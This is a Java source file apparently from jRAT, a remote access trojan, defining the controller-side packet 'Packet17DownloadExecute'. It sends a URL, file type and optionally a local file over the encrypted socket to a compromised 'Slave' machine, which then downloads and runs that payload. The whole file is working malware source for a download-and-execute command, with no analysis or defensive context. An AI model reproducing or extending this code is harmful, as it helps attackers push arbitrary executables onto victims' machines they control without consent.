package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.client.Slave;
import se.jrat.common.io.FileIO;


public class Packet17DownloadExecute extends AbstractOutgoingPacket {

	private String url;
	private String filetype;
	private boolean fromLocal;
	private File local;

	public Packet17DownloadExecute(String url, String filetype) {
		this.url = url;
		this.filetype = filetype;
	}
	
	public Packet17DownloadExecute(String url, String filetype, File local) {
		this.url = url;
		this.filetype = filetype;
		this.fromLocal = true;
		this.local = local;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		slave.writeLine(filetype);
		dos.writeBoolean(fromLocal);
		
		if (fromLocal) {
			try {
				new FileIO().writeFile(local, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), null, slave.getKey());
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	@Override
	public byte getPacketId() {
		return 17;
	}

}
